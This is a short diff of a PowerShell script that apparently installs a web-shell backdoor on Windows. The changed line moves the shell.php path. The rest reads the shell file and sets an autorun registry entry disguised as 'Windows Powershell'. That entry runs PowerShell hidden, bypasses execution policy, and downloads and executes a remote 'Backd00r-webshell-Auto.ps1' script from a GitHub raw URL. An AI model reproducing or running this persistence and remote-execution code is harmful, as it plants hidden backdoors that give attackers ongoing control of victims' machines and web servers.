@@ -1,7 +1,7 @@
 # Date : 2017-06-02
 # Author : ub3r
 # Version : 1.0
-$shell_path = "c:\shell.php"
+$shell_path = "d:\web\shell.php"
 $shell_content = [System.IO.File]::ReadAllBytes($shell_path)
 $autorunKeyName = "Windows Powershell"
 $autorunKeyVal = "powershell.exe -nop -windowstyle hidden -exec bypass -c ""IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/bigchina1/con/master/Backd00r-webshell-Auto.ps1');Backd00r-webshell-Auto.ps1"""
